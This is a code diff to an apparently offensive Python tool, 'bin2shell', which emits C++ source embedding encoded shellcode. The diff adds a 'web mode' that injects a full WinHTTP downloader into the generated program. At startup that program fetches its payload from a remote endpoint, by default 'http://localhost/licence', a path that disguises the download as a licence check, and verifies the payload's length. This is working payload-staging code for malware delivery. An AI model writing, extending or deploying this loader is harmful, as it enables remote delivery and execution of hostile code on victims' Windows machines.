@@ -3,8 +3,9 @@ from __future__ import annotations
 import hashlib
 import os
 import sys
+import textwrap
 from dataclasses import dataclass
-from typing import Any, Dict, Iterable, List, Optional
+from typing import Any, Dict, Iterable, List, Optional, Set
 
 try:
     import yaml  # PyYAML
@@ -21,6 +22,180 @@ from .utils import get_terminal_width, read_file
 DEFAULT_YAML_REL = os.path.join("data", "yaml", "algos.yaml")
 PLACEHOLDER_TOKEN = "__PAYLOAD_PLACEHOLDER__"
 
+
+def _web_fetch_helper_block() -> str:
+    return textwrap.dedent("""\n#ifndef BIN2SHELL_WEB_FETCH_HELPERS
+#define BIN2SHELL_WEB_FETCH_HELPERS
+#ifndef _WIN32
+#error "bin2shell web helpers currently support Windows only"
+#endif
+#include <stdexcept>
+#include <string>
+#include <vector>
+#include <windows.h>
+#include <winhttp.h>
+
+// Link with winhttp.lib (and ws2_32.lib if required).
+
+class Bin2ShellHttpHandle {
+public:
+    explicit Bin2ShellHttpHandle(HINTERNET h = nullptr) : handle_(h) {}
+    ~Bin2ShellHttpHandle() {
+        if (handle_) {
+            WinHttpCloseHandle(handle_);
+        }
+    }
+    Bin2ShellHttpHandle(const Bin2ShellHttpHandle&) = delete;
+    Bin2ShellHttpHandle& operator=(const Bin2ShellHttpHandle&) = delete;
+    Bin2ShellHttpHandle(Bin2ShellHttpHandle&& other) noexcept : handle_(other.handle_) {
+        other.handle_ = nullptr;
+    }
+    Bin2ShellHttpHandle& operator=(Bin2ShellHttpHandle&& other) noexcept {
+        if (this != &other) {
+            reset(other.release());
+        }
+        return *this;
+    }
+    HINTERNET get() const { return handle_; }
+    void reset(HINTERNET h = nullptr) {
+        if (handle_ != h) {
+            if (handle_) {
+                WinHttpCloseHandle(handle_);
+            }
+            handle_ = h;
+        }
+    }
+    HINTERNET release() {
+        HINTERNET tmp = handle_;
+        handle_ = nullptr;
+        return tmp;
+    }
+private:
+    HINTERNET handle_;
+};
+
+static std::wstring bin2shell_utf8_to_wide(const std::string& s) {
+    if (s.empty()) {
+        return std::wstring();
+    }
+    int needed = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
+    if (needed <= 0) {
+        throw std::runtime_error("MultiByteToWideChar failed");
+    }
+    std::wstring out(static_cast<size_t>(needed - 1), L'\0');
+    if (MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, out.data(), needed) == 0) {
+        throw std::runtime_error("MultiByteToWideChar failed");
+    }
+    return out;
+}
+
+static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) {
+    std::wstring wide_url = bin2shell_utf8_to_wide(url);
+    if (wide_url.empty()) {
+        throw std::runtime_error("URL is empty");
+    }
+
+    URL_COMPONENTSW parts{};
+    parts.dwStructSize = sizeof(parts);
+    parts.dwHostNameLength = static_cast<DWORD>(-1);
+    parts.dwUrlPathLength = static_cast<DWORD>(-1);
+
+    if (!WinHttpCrackUrl(wide_url.c_str(), 0, 0, &parts)) {
+        throw std::runtime_error("WinHttpCrackUrl failed");
+    }
+
+    std::wstring host(parts.lpszHostName, parts.dwHostNameLength);
+    std::wstring path(parts.lpszUrlPath, parts.dwUrlPathLength);
+    if (path.empty()) {
+        path = L"/";
+    }
+    INTERNET_PORT port = parts.nPort;
+    DWORD flags = (parts.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
+
+    Bin2ShellHttpHandle session(WinHttpOpen(L"bin2shell/1",
+                                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                            WINHTTP_NO_PROXY_NAME,
+                                            WINHTTP_NO_PROXY_BYPASS,
+                                            0));
+    if (!session.get()) {
+        throw std::runtime_error("WinHttpOpen failed");
+    }
+
+    Bin2ShellHttpHandle connection(WinHttpConnect(session.get(), host.c_str(), port, 0));
+    if (!connection.get()) {
+        throw std::runtime_error("WinHttpConnect failed");
+    }
+
+    Bin2ShellHttpHandle request(WinHttpOpenRequest(connection.get(),
+                                                   L"GET",
+                                                   path.c_str(),
+                                                   nullptr,
+                                                   WINHTTP_NO_REFERER,
+                                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                                   flags));
+    if (!request.get()) {
+        throw std::runtime_error("WinHttpOpenRequest failed");
+    }
+
+    static const wchar_t* kHeaders = L"Connection: close\r\n";
+    if (!WinHttpSendRequest(request.get(),
+                            kHeaders,
+                            -1L,
+                            WINHTTP_NO_REQUEST_DATA,
+                            0,
+                            0,
+                            0)) {
+        throw std::runtime_error("WinHttpSendRequest failed");
+    }
+
+    if (!WinHttpReceiveResponse(request.get(), nullptr)) {
+        throw std::runtime_error("WinHttpReceiveResponse failed");
+    }
+
+    DWORD status_code = 0;
+    DWORD status_size = sizeof(status_code);
+    if (!WinHttpQueryHeaders(request.get(),
+                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                             WINHTTP_HEADER_NAME_BY_INDEX,
+                             &status_code,
+                             &status_size,
+                             WINHTTP_NO_HEADER_INDEX)) {
+        throw std::runtime_error("WinHttpQueryHeaders failed");
+    }
+    if (status_code >= 400 || status_code == 0) {
+        throw std::runtime_error("HTTP error: " + std::to_string(status_code));
+    }
+
+    std::vector<unsigned char> body;
+    for (;;) {
+        DWORD available = 0;
+        if (!WinHttpQueryDataAvailable(request.get(), &available)) {
+            throw std::runtime_error("WinHttpQueryDataAvailable failed");
+        }
+        if (available == 0) {
+            break;
+        }
+        size_t offset = body.size();
+        body.resize(offset + available);
+        DWORD read = 0;
+        if (!WinHttpReadData(request.get(), body.data() + offset, available, &read)) {
+            throw std::runtime_error("WinHttpReadData failed");
+        }
+        body.resize(offset + read);
+        if (read == 0) {
+            break;
+        }
+    }
+
+    return body;
+}
+
+static std::string bin2shell_fetch_payload_text(const std::string& url) {
+    auto bytes = bin2shell_fetch_payload_from_url(url);
+    return std::string(bytes.begin(), bytes.end());
+}
+#endif // BIN2SHELL_WEB_FETCH_HELPERS
+""")
 
 def _normalize_newlines(value: str) -> str:
     return value.replace("\r\n", "\n").replace("\r", "\n")
@@ -67,8 +242,47 @@ class GenerationContext:
     options_meta: Dict[str, Any]
 
 
-def _make_placeholder_array(name: str, placeholder: str) -> str:
-    return f"unsigned char {name}[] = {{ /* {placeholder} */ }};\n"
+def _make_web_payload_array(name: str, expected_len: int) -> str:
+    return (
+        f"// Expected payload length: {expected_len} bytes\n"
+        f"// Update the URL to your HTTP(S) endpoint.\n"
+        f"static const std::string {name}_payload_url = \"http://localhost/licence\";\n"
+        f"static std::vector<unsigned char> {name}_storage = bin2shell_fetch_payload_from_url({name}_payload_url);\n"
+        f"unsigned char* {name} = {name}_storage.empty() ? nullptr : {name}_storage.data();\n"
+    )
+
+
+def _make_web_payload_string(name: str, expected_len: int) -> str:
+    return (
+        f"// Expected payload length: {expected_len} characters\n"
+        f"// Update the URL to your HTTP(S) endpoint.\n"
+        f"static const std::string {name}_payload_url = \"http://localhost/licence\";\n"
+        f"static std::string {name}_storage = bin2shell_fetch_payload_text({name}_payload_url);\n"
+        f"const char* {name} = {name}_storage.c_str();\n"
+    )
+
+
+def _make_web_len_block(name: str, value: int, payload_name: str, literal: bool) -> str:
+    storage = f"{payload_name}_storage"
+    if literal:
+        expected_name = f"{name}_expected"
+        var_line = f"unsigned int {name} = static_cast<unsigned int>({storage}.size());\n"
+        compare_target = name
+    else:
+        expected_name = f"{name}_expected_len"
+        var_line = f"unsigned int {name}_len = static_cast<unsigned int>({storage}.size());\n"
+        compare_target = f"{name}_len"
+    return (
+        f"static const unsigned int {expected_name} = {value};\n"
+        f"{var_line}"
+        f"static const bool {compare_target}_check = []() {{\n"
+        f"    if ({compare_target} != {expected_name}) {{\n"
+        f"        throw std::runtime_error(\"Fetched payload length mismatch for {payload_name}\");\n"
+        f"    }}\n"
+        f"    return true;\n"
+        f"}}();\n"
+        f"(void){compare_target}_check;\n"
+    )
 
 
 def _render_sections(
@@ -78,26 +292,57 @@ def _render_sections(
     placeholder: str,
 ) -> str:
     chunks: List[str] = []
+    web_payload_arrays: Set[str] = set()
+    web_payload_strings: Set[str] = set()
+    helpers_injected = False
     for section in sections:
         meta = section.meta
         if section.kind == "array":
             chunks.append(make_c_array(meta["name"], meta["data"], term_width))
         elif section.kind == "payload_array":
             if web_mode:
-                chunks.append(_make_placeholder_array(meta["name"], placeholder))
+                if not helpers_injected:
+                    chunks.append(_web_fetch_helper_block())
+                    helpers_injected = True
+                name = meta["name"]
+                expected_len = len(meta.get("data", b""))
+                web_payload_arrays.add(name)
+                chunks.append(_make_web_payload_array(name, expected_len))
             else:
                 chunks.append(make_c_array(meta["name"], meta["data"], term_width))
         elif section.kind == "string":
             chunks.append(make_c_bstring(meta["name"], meta["text"], term_width))
         elif section.kind == "payload_string":
             if web_mode:
-                chunks.append(make_c_bstring(meta["name"], placeholder, term_width))
+                if not helpers_injected:
+                    chunks.append(_web_fetch_helper_block())
+                    helpers_injected = True
+                name = meta["name"]
+                expected_len = len(meta.get("text", ""))
+                web_payload_strings.add(name)
+                chunks.append(_make_web_payload_string(name, expected_len))
             else:
                 chunks.append(make_c_bstring(meta["name"], meta["text"], term_width))
         elif section.kind == "len_var":
-            chunks.append(make_len_var(meta["name"], meta["value"]))
+            name = meta["name"]
+            value = meta["value"]
+            payload_name = meta.get("payload_name", name)
+            if web_mode and name in web_payload_strings:
+                chunks.append(_make_web_len_block(name, value, name, literal=False))
+            elif web_mode and name in web_payload_arrays:
+                chunks.append(_make_web_len_block(name, value, name, literal=False))
+            elif web_mode and payload_name in web_payload_arrays:
+                chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
+            elif web_mode and payload_name in web_payload_strings:
+                chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
+            else:
+                chunks.append(make_len_var(name, meta["value"]))
         elif section.kind == "len_literal":
-            chunks.append(f"unsigned int {meta['name']} = {meta['value']};\n")
+            payload_name = meta.get("payload_name")
+            if web_mode and payload_name in web_payload_arrays:
+                chunks.append(_make_web_len_block(meta["name"], meta["value"], payload_name, literal=True))
+            else:
+                chunks.append(f"unsigned int {meta['name']} = {meta['value']};\n")
         elif section.kind == "raw":
             chunks.append(meta.get("text", ""))
         else:
@@ -202,7 +447,7 @@ def _load_catalog(yaml_path: str) -> Catalog:
 def _build_simple_context(data: bytes) -> GenerationContext:
     sections = [
         Section("payload_array", {"name": "code_blob", "data": data}),
-        Section("len_var", {"name": "code_blob", "value": len(data)}),
+        Section("len_var", {"name": "code_blob", "value": len(data), "payload_name": "code_blob"}),
     ]
     options_meta = {
         "encoder": {"index": None, "name": "none"},
@@ -243,7 +488,16 @@ def _build_catalog_context(
 
     if envelope_name == "none":
         sections.append(Section("payload_array", {"name": "enc_buf", "data": enc_bytes}))
-        sections.append(Section("len_literal", {"name": "enc_len", "value": len(enc_bytes)}))
+        sections.append(
+            Section(
+                "len_literal",
+                {
+                    "name": "enc_len",
+                    "value": len(enc_bytes),
+                    "payload_name": "enc_buf",
+                },
+            )
+        )
         payload_bytes = enc_bytes
     else:
         try:
@@ -251,7 +505,16 @@ def _build_catalog_context(
         except Exception as exc:
             raise CLIError(f"Envelope error (index {env_idx}): {exc}")
         sections.append(Section("payload_string", {"name": "code_blob_text", "text": envelope_text}))
-        sections.append(Section("len_var", {"name": "code_blob_text", "value": len(envelope_text)}))
+        sections.append(
+            Section(
+                "len_var",
+                {
+                    "name": "code_blob_text",
+                    "value": len(envelope_text),
+                    "payload_name": "code_blob_text",
+                },
+            )
+        )
         sections.append(Section("raw", {"text": "\n// ---- inline envelope decode ----\n"}))
         env_cpp = env_spec["cpp_decode"]
         sections.append(Section("raw", {"text": safe_format_cpp(env_cpp, {})}))
